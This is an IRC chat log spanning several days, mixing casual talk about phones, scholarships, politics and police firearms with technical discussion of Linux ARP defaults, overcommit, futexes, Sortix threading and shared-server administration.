May 16 14:53:05 <Eldis4>	​hydraz: Cat most commonly refers to the domestic cat, Felis catus, or Felis silvestris catus Cat may also refer …  <http://en.wikipedia.org/wiki/CAT>
May 16 14:53:07 <hydraz>	Ah.
May 16 14:53:14 <hydraz>	Yeah, I don't think they'd make for good phones.
May 16 14:53:26 <john_cephalopoda>	CAT makes good excavators and other building machines.
May 16 14:53:26 <nanovad>	shikhin: I'm saying that I would rather smartphone manufacturers (big names that I'd somewhat-trust with my money) to make phones that aren't so delicate, instead of pushing to make them thinner/lighter
May 16 14:53:30 <hydraz>	I'm kidding.
May 16 14:53:36 <john_cephalopoda>	The phones are just produced in license though, by a company with horrible support.
May 16 14:53:46 <shikhin>	hydraz: They're not. e.g. the options I listed have thicknesses covering the entire span of 7mm to 11mm or whatever.
May 16 14:54:06 <john_cephalopoda>	Had one once. The manual didn't correspond with the actual features of the phone and the tech service wasn't very helpful.
May 16 14:54:08 <hydraz>	yeah but they look ugly as fuck
May 16 14:54:13 <hydraz>	what are those corners
May 16 14:56:51 <shikhin>	nanovad: Out of curiosity, what's a thickness that's preferable to you?
May 16 14:57:31 <nanovad>	I have a 10mm that's comfy in my hand, but it's a very specific form that I like. If it were anything else, probably 11-12
May 16 14:58:03 <shikhin>	Ah.
May 16 14:58:30 *	shikhin has an 8mm phone with a 2mm case, and that feels just right to him.
May 16 14:59:13 <shikhin>	(Although sometimes this feels annoyingly thick in the pockets to me.)
May 16 15:04:07 <nanovad>	hmm.

May 16 16:14:40 <CompanionCube>	shikhin: hydraz: so i just posted to the soviet confederacy flag on a discord where one of the people is highly likely to have an amusing reaction to it.
May 16 16:14:42 <CompanionCube>	Now we wait.

May 16 16:23:28 <shikhin>	Can't decide.
May 16 16:23:41 <shikhin>	I'm actually feeling sleepy again, but it's too early and I feel like there's things I should be doing.
May 16 16:23:50 <shikhin>	Just not sure what, so I'll listen to music and nap.
May 16 16:24:27 <shikhin>	(Probably do more math is what I should be doing.)
May 16 16:24:32 <hydraz>	hm. I feel incredibly retarded
May 16 16:26:06 <hydraz>	shikhin: a round of RA?
May 16 16:26:29 <shikhin>	…
May 16 16:26:41 <shikhin>	What was the exact issue?
May 16 16:26:54 <hydraz>	SDL2 doesn't link against libGL, and libGL was removed from a system-wide location.
May 16 16:27:11 <shikhin>	Ah.
May 16 16:27:18 <shikhin>	I love how you said this is all you'll do, and yet you investigated into it more.
May 16 16:27:26 <hydraz>	I was trying to run Xonotic.
May 16 16:27:34 <shikhin>	Ah.
May 16 16:27:47 <hydraz>	Xonotic also happens to use SDL2-which-doesn't-link-against-libGL, but that gave me a useful error message

May 16 16:33:21 <hydraz>	There is a legitimate point to be made here about the quality of OpenRA's error messages, though. If it told me it failed to load libGL.so.1 I'd have fixed this about a wekk ago.

May 17 10:53:18 <nanovad>	… actually that isn't a bad idea
May 17 10:53:50 <nanovad>	One centrally managed configuration with voted PRs, could use existing infra and Github democracy bots
May 17 10:53:52 <CompanionCube>	nanovad: doesn't have to be NixOS specifically
May 17 10:54:04 <CompanionCube>	any configuration management system worth a damn could work :p
May 17 10:54:07 <nanovad>	no, but it'd fit here too
May 17 10:54:31 <CompanionCube>	(sadly most configuration management systems are ill-suited to such a purpose. Complexity everywhere.)

May 17 10:58:23 <nortti>	I mean, I would say that is a fair point to make in this context
May 17 10:58:53 <nortti>	just because nazi comparisons have been used to the death doesn't mean there aren't cases where it makes sense to bring up nazis

May 17 11:07:00 <shikhin>	Unrelatedly; the scholarship advise I got was someone circled out the scholarships I should apply to on a piece of paper.
May 17 11:07:01 <S_Gautam>	"Newsagents to sell ‘porn passes’ to visit X-rated websites anonymously under new government plans."
May 17 11:07:04 *	shikhin is already stressed out.
May 17 11:07:39 <nortti>	what's the application process like?
May 17 11:08:09 <shikhin>	Apparently at the top of the list––based on $$$$ and urgency––is the Rhodes scholarship. I still haven't made up my mind if I like $$$$ more or my principles behind not accepting money from a scholarship named after Rhodes.
May 17 11:08:25 <nortti>	mh
May 17 11:08:56 <nortti>	what do you gain out of not accepting the money? what do they gain out of you accepting the money?
May 17 11:09:07 <S_Gautam>	it's just a place in Greece?
May 17 11:09:15 <shikhin>	Hm.
May 17 11:09:16 <nortti>	cecil rhodes
May 17 11:09:30 <shikhin>	nortti: For the Rhodes thing, I need to first make sure I can apply from India… then make a resume and write a personal statement, presumably. Then some interviews.
May 17 11:09:35 <nortti>	mh
May 17 11:10:12 <nortti>	reminds me of one of openbsd people commenting that hopefully the money they get from the department of defence (iirc) means a couple less missiles. dod decided to not continue supporting obsd next time renewals came up
May 17 11:10:12 <shikhin>	< nortti> […] what do they gain out of you accepting the money? <- Presumably association with me if I amount to anything in life? I have no idea what I gain out of not accepting the money.

May 17 11:12:37 <emily>	"As elaborated on in his will, Cecil Rhodes' goals in creating the Rhodes Scholarships were to promote civic-minded leadership among "young colonists"[4]:24 with "moral force of character and instincts to lead", for "the furtherance of the British Empire, for the bringing of the whole uncivilised world under British rule, for the recovery of the United States, for the making the Anglo-Saxon race but one

May 17 11:13:52 <nortti>	:D:
May 17 11:14:20 <S_Gautam>	Huh, so you need to get a UG degree outside an Indian university to be applicable for the scholarship?
May 17 11:14:24 <shikhin>	N-no.
May 17 11:14:43 <shikhin>	Re-read what I pasted; there's five scholarships available for Indians. Only one (or two) may be awarded to people not studying in India.
May 17 11:15:42 <shikhin>	Meh. There will be an in-person interview held in October/November 2018 in Delhi. They will reimburse a "2nd class return rail fare" for that, and you *must* attend.
May 17 11:17:27 <shikhin>	"Additional referees should testify to your character and/or your involvement in extra-curricular/service or leadership activities. These referees should be persons who are able to comment critically on whether you fulfil the extra-curricular, non-academic requirements of the Scholarship and who can speak in detail to your character."

May 17 11:19:05 <shikhin>	(At least) 3 people from my university, a total of 6 referees.
May 17 11:19:17 <nortti>	wow
May 17 11:19:26 <shikhin>	The former is fine. I could probably find 6 academic referees as well… but I have no idea who to contact for non-academic reference?
May 17 11:19:53 <shikhin>	nortti: "A good referee is one who knows you well, rather than a well-known person who only knows you superficially. Your referees will not typically be personal friends, relations or contemporaries."
May 17 11:20:04 <nortti>	damn
May 17 11:20:05 <shikhin>	Although, honestly, given what they have stated, I am tempted to pick e.g. you.
May 17 11:20:29 <shikhin>	("If you do request a reference from a referee who falls into this category then they should make the connection clear within the reference.")

May 17 11:23:06 <nortti>	what does being deferred refer to in here?
May 17 11:23:29 <shikhin>	You can't say "I want to not attend university this year, can my scholarship start paying me from next year?", which I very much wanted to do.

May 31 22:43:08 <S_Gautam>	hello, shikhin 
May 31 22:45:28 <shikhin>	How's it going?
May 31 22:46:59 <S_Gautam>	good i was revising some chemistry until i read the wikipedia article about 2002 and right now i'm scarred as fuck
May 31 22:47:19 <emily>	lol why
May 31 22:47:32 <shikhin>	=w 2002 Gujarat riots
May 31 22:47:33 <Eldis4>	​shikhin: The 2002 Gujarat riots, also known as the 2002 Gujarat violence and the Gujarat pogrom, was a three-day period of inter-communal violence in the western Indian state of Gujarat.  <http://en.wikipedia.org/wiki/2002_Gujarat_riots>
May 31 22:47:48 <S_Gautam>	"It is estimated that at least two-hundred and fifty girls and women were gang raped and then burned to death.[77] Children were force fed petrol and then set on fire,[78] pregnant women were gutted and then had their unborn child's body shown to them."
May 31 22:48:11 <shikhin>	(I think she meant why 2002, because not everyone knows what you're referring to.)
May 31 22:48:22 <Mutabah>	...
May 31 22:48:31 <Mutabah>	Yeah... you didn't need to go into details
May 31 22:48:48 <Mutabah>	That is something I did _not_ want to know about
May 31 22:49:53 <emily>	narendra modi is not great right
May 31 22:50:01 <emily>	... i forget if politics talk is allowed in here at all
May 31 22:50:08 <shikhin>	I-it is.
May 31 22:50:15 <shikhin>	And yes, he isn't.
May 31 22:50:29 <S_Gautam>	the alternatives aren't that great either
May 31 22:50:38 *	S_Gautam wishes for a military coup
May 31 22:50:42 *	shikhin blinks.
May 31 22:51:00 <emily>	you have some really reactionary opinions
May 31 22:51:03 <S_Gautam>	i'd rather see tanks with indian flags than with BJP saffron hindu flags
May 31 22:51:08 <S_Gautam>	serious
May 31 22:51:30 <emily>	and i guess it's maybe weird for freenode or something, but I guess it might not be weird for india as a whole? but it's kind of interesting...
May 31 22:51:43 <shikhin>	His reactions?
May 31 22:51:56 <emily>	hm?
May 31 22:52:07 <shikhin>	What might not be weird for India as a whole?
May 31 22:52:09 <emily>	oh, just having those kinds of right-ish opinions
May 31 22:52:17 <emily>	I don't know what the political norm is there
May 31 22:52:19 <shikhin>	Ah. I dunno, seem fairly weird to me.
May 31 22:52:24 <Mutabah>	its' better than having wrong-ish opinions? :)
May 31 22:52:39 <S_Gautam>	emily: how is wishing for a military coup right-ish
May 31 22:52:59 <emily>	(although being immersed in western culture my impression of politics in india is something like "everything is on fire all of the time", but that's probably mostly because of racism.)
May 31 22:53:05 <emily>	S_Gautam: maybe not right-ish
May 31 22:53:13 <emily>	"authoritarian-ish", if you want to go by the political compass axes
May 31 22:54:22 <emily>	ahh, I'm sorry, I feel like I always cause firestorms here!
May 31 22:54:40 <shikhin>	You seem fine to me.
May 31 22:54:45 <S_Gautam>	yeah you're fine
May 31 22:56:21 <shikhin>	(As for you impression of politics in India, that doesn't seem that inaccurate to me.)

May 31 23:04:41 <shikhin>	What's 'science scholarship'?
May 31 23:04:47 <S_Gautam>	KVPY
May 31 23:04:53 <shikhin>	Ah.
May 31 23:04:54 <S_Gautam>	=w KVPY
May 31 23:04:54 <Eldis4>	​S_Gautam: Kishore Vaigyanik Protsahan Yojana(English: Young Scientist Incentive Plan) (KVPY) is a scholarship program funded by the Department of Science and Technology of the Government of India, aimed at encouraging students to take up research careers in the …  <http://en.wikipedia.org/wiki/KVPY>
May 31 23:05:34 <S_Gautam>	emily: As for my authoritarian views, honestly, mob lynchings, and extra-judicial killings are quite common. I grew up in a small town on the Eastern side and the major reason we had to move was caste-based violence. Maybe if the government had been less negligent and more authoritarian it could have suppressed the violence.
May 31 23:06:27 *	shikhin looks at the state sponsoring or supporting caste (or religion) based violence now.
May 31 23:08:33 <S_Gautam>	Exactly, that's why whenever a large scale riot happens, the armed forces have to be deployed eventually.
May 31 23:09:02 <S_Gautam>	Because the incumbent government at the time is incomptent to handle the riots or supports it secretly.
May 31 23:09:21 <S_Gautam>	(1984, 1992, 2002, ...)
May 31 23:09:45 <shikhin>	…right, obviously the regions with AFSPA in place have turned out perfectly.
May 31 23:10:42 <S_Gautam>	Hasn't turned out perfectly, but better than what would have happened in the absence of the army.
May 31 23:11:08 <shikhin>	So you say.
May 31 23:11:59 <S_Gautam>	Well, suggest a better alternative
May 31 23:13:04 <shikhin>	I don't know, just about anything would be better than granting the army any more power.
May 31 23:16:35 <S_Gautam>	honestly i'm not a big fan of armies taking over and shit
May 31 23:16:49 <S_Gautam>	but when you've people being killed like that
May 31 23:18:56 <S_Gautam>	back to chemistry, this is depressing

Jun 01 12:51:54 <john_cephalopoda>	Self-hosting might be the best thing.
Jun 01 12:52:40 <john_cephalopoda>	The only issue with self-hosting is, that all your stuff disappears when you go offline (for financial reasons or other)
Jun 01 12:56:12 <john_cephalopoda>	You theoretically also have the possibility that github goes down though...

Jun 01 15:52:20 <john_cephalopoda>	S_Gautam: I think "Roter Gruß" would make sense. "Gruß" means "Greetings" but also "Salute", depending on context.
Jun 01 15:55:18 <john_cephalopoda>	Lol, when a German soldier greets another one, the greeting soldier has the right to be greeted back properly.
Jun 01 15:55:27 <john_cephalopoda>	No matter which rank the soldiers have.
Jun 01 15:57:01 <john_cephalopoda>	It's specified in the Zentrale Dienstvorschrift (ZDv) 10/8 and ZDv 3/2.
Jun 01 15:58:03 <john_cephalopoda>	A walking soldier has to keep walking and greet when 3 steps away from the one who is greeted. A standing soldier has to turn to the one to be greeted. A sitting soldier must stand up and greet.
Jun 01 15:58:35 <shikhin>	This is specified in text? o.o

Jun 01 16:00:32 <john_cephalopoda>	I think so.
Jun 01 16:01:50 <john_cephalopoda>	Also left-handed greetings are only allowed when an injury or a disability prevents greeting with the right hand to the head.
Jun 01 16:03:17 <john_cephalopoda>	The full text is unfortunately not available because it's internal documents.
Jun 01 16:03:39 <john_cephalopoda>	I know though that it's specified from which water depth on the soldiers must start swimming.

Jun 05 09:13:12 <emily>	the cops have guns here in Canada, which is freaky, but apparently they have to fill out paperwork every time they even draw it
Jun 05 09:13:31 <emily>	so probably not much random innocent-civilian shooting going on
Jun 05 09:14:25 <XgF>	emily: I mean this is true of most of the world tbh
Jun 05 09:14:39 <XgF>	emily: GB is exceptional for not having that (and I say GB specifically because NI police *do* have guns)
Jun 05 09:14:56 <john_cephalopoda>	233 people were killed by police in the USA this year.
Jun 05 09:15:02 <emily>	how does UK manage to be so dystopian and scary when the police don't even have guns!!

Jun 05 09:16:06 <john_cephalopoda>	emily: Police doesn't have guns, but so do criminals. When you got a 1984-esque situation, you know when you can take out somebody without needing a gun.

Jun 05 09:17:49 <nortti>	finnish police carry handguns ~always, and aiui recentlyish patrols have started to carry semi-automatic weapons in cars (tho unsure about this)
Jun 05 09:18:21 <nanovad>	Semi-automatic as in rifles?
Jun 05 09:18:24 <nortti>	yea
Jun 05 09:18:50 <nortti>	right, pistols are semi-automatic too most of the time

Jun 05 09:20:11 <nanovad>	pew pew
Jun 05 09:20:38 <nortti>	it used to be that police carried submachine guns, but after some shootout several decades ago it turned out they didn't really make cops' job any safer, so they were phased off. after the first¹ terrorist attack here since the second world war last year, there was talks of reintroducing them
Jun 05 09:21:43 <XgF>	Firearms officers in the UK tend to carry a pistol plus have an SMG or assault rifle in their car
Jun 05 09:22:24 <XgF>	Having a set of specifically trained officers with bigger arms is generally sensible tbh, but training every cop in them is impractical
Jun 05 09:22:53 <nortti>	(¹ in just last ten years I can remember at least three politically motivated acts of violence against people by the far right (helsinki pride gas attack, jyväskylä library stabbing, killing of jimi karttunen) but for whatever reason that is not terrorism™)
Jun 05 09:24:24 <nanovad>	It's only terrorism if it's Islamic, duh

Jun 05 10:55:19 <john_cephalopoda>	Heh, now people are starting to discuss about federating git.
Jun 05 10:55:35 <nortti>	git or git hosting?
Jun 05 10:55:56 <nortti>	or, well, git hosting, issue tracking, wikis, et cetera
Jun 05 10:56:55 <john_cephalopoda>	Well, not quite hosting. But you can commit to any repo on any server when you got an account in the federation. Also issues, wikis etc., of course.
Jun 05 10:57:31 <nortti>	"commit to any repo on any server" no access control?
Jun 05 10:58:05 <john_cephalopoda>	Well, of course access control.
Jun 05 10:58:34 <nortti>	who authenticates? one's "home" server?
Jun 05 10:58:50 <john_cephalopoda>	It will probably be done like ActivityPub.
Jun 05 10:59:00 <john_cephalopoda>	Or actually using ActivityPub.
Jun 05 11:00:02 <john_cephalopoda>	So I guess you can invite @somedev from gitfederationthingie.org to join your repo at someothergitfederation.com.
Jun 05 11:00:35 <nortti>	right. just thinking since activitypub, aiui, isn't designed for controlling shared mutable resources
Jun 05 11:01:29 <john_cephalopoda>	How I understood it, it's meant for passing and federating messages around, e.g. issue comments.

Jun 05 11:50:30 <vehk>	Need opinions: by default, the Linux kernel sends ARP announces for every address it has on any interface it has. That is, if you have a private address 10.0.0.1 on interface tun0, it will announce ARP on, say, a public IP on eth0.
Jun 05 11:50:39 <vehk>	I was not aware of this behaviour, and frankly I think it's bad.

Jun 05 11:53:09 <vehk>	(Although even then you could argue that you have two entirely disconnected networks for which there should be no ARP outgoing to a network about the respective other one)
Jun 05 11:53:48 <nortti>	how'd it assbite you?
Jun 05 11:54:34 <vehk>	Well, my hoster mailed me that my server was answering requests for private addresses (they did not get back to me yet about my questions - it was really stated this vaguely), and for the last 5 hours I couldn't find out why

Jun 05 12:19:20 <vehk>	While I wouldn't say that the default here is nonstandard (it makes sense for the host model), I would say that the reasoning that it increases the likelyhood of two hosts communicating is somewhat bogus

Jun 05 12:34:05 <vehk>	Whereas the strong host model only accepts the packet if the dest address actually matches the address (subnet) of the interface it was received on
Jun 05 12:35:09 <CompanionCube>	lol, after upgrading to 4.16 apparently it takes longer for the CRNG to be properly initialized so i have stuff like this in early dmesg now:

Jun 05 12:36:51 <nortti>	vehk: hm, so what's the difference between the strong host model and the interface based model (as used in that redhat bugzilla link)?
Jun 05 12:37:36 <vehk>	I think the interface based model is the strong host model - I couldn't find anything about the interface based model (like someone else commented in the bug report)
Jun 05 12:37:40 <vehk>	So... I don't know for sure

Jun 05 12:49:18 <sortie>	vehk: nortti: In Sortix, each network interface has configured a netmask. When the IP stack wants to send to an address, it locates the network address with the right subnet, and then it sends an ARP broadcast on that network
Jun 05 12:49:36 <vehk>	Yeah, I'd expect that sort of behaviour.
Jun 05 12:49:48 <vehk>	Frankly, I expected it from Linux as well, but Linux defaults are... well... bad.

Jun 05 12:50:39 <sortie>	vehk: Tired of Linux? Tired of overcommit? Tired ARP broadcasting on the wrong interfaced. Boy, do I have an operating system for you! TRY SORTIX WITH JUST THE RIGHT AMOUNT OF COMMITMENT

Jun 05 12:54:15 <nortti>	vehk: uh, as in, it ignores the other 50%?
Jun 05 12:54:48 <vehk>	It goes OOM if you go over 50&
Jun 05 12:54:50 <vehk>	% even
Jun 05 12:55:30 <nortti>	that… seems like sth that shouldn't be controlled by overcommit_ratio
Jun 05 12:56:07 <vehk>	I guess I can see that the kernel will also keep memory allocated, but... 50% is a bit low
Jun 05 12:56:27 *	nortti . o O (designed for systems with 8MB of RAM)
Jun 05 12:56:37 <vehk>	ie you could also argue that you just want 50% to be cache and non-allocatable otherwise
Jun 05 12:56:41 *	vehk shrugs
Jun 05 12:56:43 <nortti>	mh
Jun 05 12:56:44 <vehk>	I think it's a bad default
Jun 05 12:56:50 <nortti>	I agree
Jun 05 12:57:57 <vehk>	I mean, I think it's a bad default in the first place to have overcommit enabled, but that's another thing :D:
Jun 05 12:58:18 <emily>	how can you avoid overcommit when you have fork?
Jun 05 12:58:25 <emily>	Unix is broken :(
Jun 05 12:58:33 <emily>	with COW fork(), overcommit makes sense
Jun 05 12:58:37 <emily>	without COW fork(), Unix is too slow
Jun 05 12:59:07 <nortti>	yeah, gotta agree with that. you can reserve the amount of memory it would need, but that can lead to really nonsensical OOMs
Jun 05 13:00:01 <nortti>	on the other hand, did not run into that when I ran freebsd on a system with half a gig of ram, so I'd be kinda willing to say the cons outweight the pros
Jun 05 13:00:02 <sortie>	nortti: FIGHT THE POWER
Jun 05 13:01:01 <nortti>	also, I guess you can mitigate that with having swap
Jun 05 13:01:21 <sortie>	nortti: Sortix uses advanced technology so it only consumes the CPU power of a single core regardless of how many cores you have.
Jun 05 13:01:27 <nortti>	lol
Jun 05 13:01:30 <sortie>	It also doesn't have SMP.
Jun 05 13:01:39 <nortti>	does it have AMP?
Jun 05 13:01:39 <sortie>	Incidentally I use the same technology for network security.
Jun 05 13:02:16 <sortie>	nortti: https://gitlab.com/sortix/sortix/issues/235 is an interesting issue
Jun 05 13:02:17 <bslsk05>	​gitlab.com: Power efficient idling (#235) · Issues · sortix / Sortix · GitLab
Jun 05 13:02:31 <sortie>	Even if I use the hlt instruction and other power management, the system can't idle until I improve the thread implementation
Jun 05 13:02:41 <nortti>	mh
Jun 05 13:03:01 <nortti>	why is that?
Jun 05 13:04:24 <sortie>	nortti: All thread locks are spinlocks
Jun 05 13:04:29 <nortti>	…ouch
Jun 05 13:04:41 <sortie>	So the threads never actually sleep. They really just context switch whenever they go idle.
Jun 05 13:05:07 <sortie>	If everything is idle, the system just keeps running all threads, each doing nothing but running the next one
Jun 05 13:05:20 <sortie>	It's a bunch of work to fix that
Jun 05 13:05:33 <nortti>	hm, I remember reading some paper on implementing efficient locks in qnx but fuck me if I remember how or where I ran into it
Jun 05 13:05:34 <sortie>	nortti: But then there's special threads like the interrupt safe worker thread
Jun 05 13:05:56 <sortie>	nortti: And then there's futexes so user-space can also do true sleeps
Jun 05 13:06:09 <nortti>	mh
Jun 05 13:06:38 <nortti>	hm, actually, now that I think of it I think it was sth about futexes
Jun 05 13:07:38 <nortti>	"In 2002 discussions took place on a proposal to make futexes accessible via the file system by creating a special node in /dev or /proc. However, Linus Torvalds strongly opposed this idea and rejected any related patches."
Jun 05 13:14:30 <olsner>	I wonder if futexes are state of the art, or if not how other OSes like to implement their mutexes in comparison
Jun 05 13:15:26 <nortti>	obsd got them in 2016 according to wikipedia, so I guess not quite state of art but still not universal
Jun 05 13:15:51 <olsner>	what was the pre-futex implementation in Linux? just a syscall for every operation?
Jun 05 13:17:14 <nortti>	no idea, but nothing else "obvious" comes to mind for cross-process synchronization
Jun 05 13:19:47 *	nortti . o O (shared memory and spinlocks)
Jun 05 13:20:00 <nanovad>	equipment get: semi-broken printer
Jun 05 13:20:10 <nortti>	semi?

Jun 05 13:21:50 <hydraz>	HP
Jun 05 13:21:52 <hydraz>	it semi.works
Jun 05 13:21:56 <nanovad>	fucking hell
Jun 05 13:22:04 <nanovad>	This is an HP, I had another HP do it too
Jun 05 13:22:27 <vehk>	Rule 136: There are no good consumer-grade printers
Jun 05 13:22:42 <olsner>	seems LinuxThreads did something with signals to wake up waiting threads
Jun 05 13:22:59 *	nanovad . o O ( moving an office-grade printer to my room on the 2nd floor )
Jun 05 13:23:44 <olsner>	the clunk noises are the pixels being stamped into the paper
Jun 05 13:23:49 <nanovad>	Oh, that makes sense.
Jun 05 13:23:57 <vehk>	I really should possibly read the doc on every single kernel option... nobody tells you that it's configured badly by default
Jun 05 13:24:32 <olsner>	I wouldn't be surprised if every gentoo forum post about kernel configuration says exactly that?
Jun 05 13:24:55 <nanovad>	*Inception horn* everything you know is w r o n g
Jun 05 13:24:59 <olsner>	(and then proceeds to tell you to configure it in a worse way :P)
Jun 05 13:25:44 <vehk>	I don't mean the .config ones, I mean the ones you can change whilst it's running (is there a name for these)
Jun 05 13:25:51 <vehk>	Like net.ipv4.conf.all.rp_filter
Jun 05 13:26:08 <olsner>	sysctl maybe? but iirc there are two different categories of those
Jun 05 13:26:11 <vehk>	Yeah
Jun 05 13:27:02 <vehk>	I bet lots of services have rp_filter set to 0, because it's the default
Jun 05 13:27:22 <vehk>	Even though setting it to 1 prevents IP spoofing from DDos and such, and has no impact on anything else...
Jun 05 13:28:37 <vehk>	Same with tcp_syncookies
Jun 05 13:29:14 <olsner>	rp_filter are all set to 1 for me, except for loopback
Jun 05 13:29:30 <olsner>	(defaultish ubuntu system)
Jun 05 13:29:35 <vehk>	I guess distros have reasonable defaults then
Jun 05 13:30:15 <olsner>	tcp_syncookies is also 1
Jun 05 13:30:40 <vehk>	Mind checking net.ipv4.conf.all.arp_announce and net.ipv4.conf.all.arp_ignore ?
Jun 05 13:31:40 <olsner>	all zeroes
Jun 05 13:31:43 <vehk>	mhm
Jun 05 13:32:04 <vehk>	Those are not really problematic unless you have specific setups
Jun 05 13:32:17 <vehk>	But eh, enough of this madness, /me does something else
Jun 05 13:35:01 <CompanionCube>	hydraz: all printers only semi.work

Jun 05 13:47:03 <olsner>	it seems this touchpad has a "smart" kinetic scrolling simulation going on, so whenever I scroll in the browser and press ctrl within a second it zooms all the way in
Jun 05 13:47:44 <olsner>	and most pages have somewhat broken layout at 1000% zoom
Jun 05 13:47:58 <vehk>	haha
Jun 05 13:48:18 <vehk>	I mean what would we do if all our devices weren't smart?

Jun 05 15:20:58 *	zgrep . o O ( ahti )
Jun 05 15:21:48 <CompanionCube>	zgrep: that's what i thought too
Jun 05 15:23:27 <zgrep>	Well, it is how I felt, sort-of. Maybe the key to getting ahti to work is good documentation. Which sounds like effort.
Jun 05 15:24:24 <CompanionCube>	it's already working
Jun 05 15:24:34 <zgrep>	Fair enough.
Jun 05 15:25:34 <CompanionCube>	it could be improved but all the configuration management systems are...eh.
Jun 05 15:25:38 *	zgrep should transfer over to ahti at some point.
Jun 05 15:25:50 <zgrep>	And then I can move ahti-....zgrep.org --> zgrep.org. And people will have to type less.
Jun 05 15:26:47 <vehk>	Good documentation is part of it, but mostly I think it's adhering to a standard - and enforcing that as well.
Jun 05 15:26:48 <zgrep>	Eventually.™ Also I'd need access to my backups to find my linode 2fa key to change DNS stuff.
Jun 05 15:27:00 <vehk>	For example, if you have an initd, use that instead of setting up stuff locally in a tmux
Jun 05 15:27:02 <vehk>	etc.
Jun 05 15:27:33 <CompanionCube>	vehk: except if you need interactive access
Jun 05 15:27:49 <vehk>	Where do you need that?
Jun 05 15:27:54 <zgrep>	Well, you'd need to document the standard somewhere.
Jun 05 15:28:00 <vehk>	Sure
Jun 05 15:28:17 *	CompanionCube has attached to the xonotic tmux to run console commands without setting up rcon
Jun 05 15:28:39 <vehk>	Sounds more like laziness than a real need for an interactive console
Jun 05 15:28:43 <vehk>	:p
Jun 05 15:29:33 <vehk>	But even then, one user per thing (if possible) - so people can go look for the xonotic user if they want to do xonotic things
Jun 05 15:29:52 <vehk>	Also things like: If it's available in your package manager, use that
Jun 05 15:29:56 <vehk>	If not, try to get it there
Jun 05 15:30:11 <vehk>	If that is really too hard, install to /usr/local instead of /usr /bin etc
Jun 05 15:30:31 <zgrep>	Some package managers install stuff into /usr/local.
Jun 05 15:30:37 <vehk>	Sure, that's fine then
Jun 05 15:30:42 <zgrep>	I believe OpenBSD installs things into /usr/local by default?
Jun 05 15:31:17 <zgrep>	Err, OpenBSD's pkg_add, at least.
Jun 05 15:31:24 <vehk>	Right
Jun 05 15:31:28 <CompanionCube>	it's reasonably common with the BSDs  isn't it?
Jun 05 15:31:51 <vehk>	I was mainly talking about how on ahti there used to be two h2o installations, one in /usr, one in /usr/local, neither from apk
Jun 05 15:31:56 <zgrep>	It makes me feel uncomfortable adding my owns things there, for some reason.
Jun 05 15:32:30 <vehk>	Also probably things need cleaning after a while, or just maintenance
Jun 05 15:32:36 <zgrep>	I don't know how the one in /usr got there. I believe make install added to /usr/local by default, but maybe not?
Jun 05 15:32:40 <zgrep>	(/uncomfortable/ was regarding openbsd and /usr/local)
Jun 05 15:32:46 <vehk>	For example, fail2ban is still installed, even though it's not running
Jun 05 15:33:20 <zgrep>	That seems like a nice thing to have running.
Jun 05 15:33:36 <vehk>	I'm not sure whether it's even configured properly
Jun 05 15:34:29 <vehk>	Also - just as a disclaimer - not trying to sound harsh, neither trying to blame anyone
Jun 05 15:34:37 *	CompanionCube uses guix to mostly isolate ikiwiki's blob of perl and other dependencies from the system as a whole
Jun 05 15:34:48 <vehk>	And I guess you could ask why I don't fix all these things, and the answer is that I just don't have the time to manage yet another thing
Jun 05 15:34:51 *	nanovad pokes at his socket code
Jun 05 15:34:52 <nanovad>	ew
Jun 05 15:34:59 <CompanionCube>	originally I didn't do that...but fucking imagemagick
Jun 05 15:35:09 <vehk>	Mhm, I can see that tbh
Jun 05 15:35:28 <vehk>	I tend to try and do that as well, if you can isolate things neatly
Jun 05 15:35:37 <vehk>	(And no, docker isn't neat :p)
Jun 05 15:36:01 <nanovad>	me: *wondering why my socket server isn't accepting connections*
Jun 05 15:36:12 <nanovad>	me: *slowly realizing that it is, but it's not giving output because I forgot newlines*
Jun 05 15:36:20 <john_cephalopoda>	CompanionCube: "Managing a server with multiple friends" is basically ahti.
Jun 05 15:36:29 <CompanionCube>	john_cephalopoda: thatsthejoke.jpg
Jun 05 15:36:36 <vehk>	CompanionCube: What do you need perl for with imagemagick?
Jun 05 15:36:49 <CompanionCube>	vehk: alpine's version was too new for me to get it to work
Jun 05 15:36:52 *	nanovad . o O ( democracyd will fix all your ahti glitches )
Jun 05 15:36:52 <vehk>	Oh, I see
Jun 05 15:36:59 <CompanionCube>	and you can't install multiple versions iirc
Jun 05 15:37:02 <vehk>	Right
Jun 05 15:37:22 <CompanionCube>	(it's also neater to let the package manager install all the CPAN modules for me)
Jun 05 15:37:40 <zgrep>	vehk: That's more than fair. ahti's just a way to let other people do work instead of me. :P
Jun 05 15:37:43 <nanovad>	hm, for a server with only a few connections at once, is it good to just spawn a new thread per connection or is it better to use select/poll and things of that sort?
Jun 05 15:37:54 <nanovad>	it's likely just one to three connections at once, really
Jun 05 15:37:55 <vehk>	Mmh, yes. Bah, CPAN is just a bit of a shitshow, like any other "package manager" for a language
Jun 05 15:38:34 <CompanionCube>	vehk: my previous solution was interactive use of CPAN dumping it all into an opaque ~/perl5 directory
Jun 05 15:38:40 <zgrep>	guix seems interesting... but I just don't... feel like learning it. :(

Jun 05 15:40:14 <CompanionCube>	vehk: inb4 contain all the things in *bsd jails or illumos zones
Jun 05 15:40:23 <vehk>	I'd be up for the jail idea, I think
Jun 05 15:40:34 <vehk>	Although unless you *really* need it, just have it installed normally
Jun 05 15:40:47 <CompanionCube>	john_cephalopoda: ikiwiki uses it to do things with images
Jun 05 15:40:50 <CompanionCube>	like resizing them
Jun 05 15:40:53 *	zgrep (vaguely) knows somebody who spins up VMs for separate things.
Jun 05 15:41:24 <CompanionCube>	VMs are overkill :(

Jun 05 15:41:46 <john_cephalopoda>	CompanionCube: Ah. I got a script on ahti that I used to auto-generate the page for the inktober challenge. I used imagemagick in it to create image thumbnails.
Jun 05 15:41:54 <vehk>	Well, yeah, VMs have a significant overhead, and they're not really more secure anyway
Jun 05 15:42:10 <vehk>	I'm going with less code and less attack surface = better security
Jun 05 15:42:29 <vehk>	Unless you have to cross OS boundaries, just don't do VMs

Jun 05 15:46:38 <zgrep>	Exactly. It's on its way to becoming a popular OS.
Jun 05 15:46:46 <john_cephalopoda>	emacs is still way more popular.
Jun 05 15:46:58 <vehk>	Bloated, sure, useful? How is GRUB not useful when it boots your system?
Jun 05 15:47:17 <john_cephalopoda>	Most of the times I tried it, GRUB didn't boot my system.
Jun 05 15:47:22 <john_cephalopoda>	It just took ages to install it. 
Jun 05 15:47:26 <CompanionCube>	john_cephalopoda: GRUB isn't as much bloated as complex
Jun 05 15:47:46 <john_cephalopoda>	And it has a nice script that generates a config for you that doesn't work. 
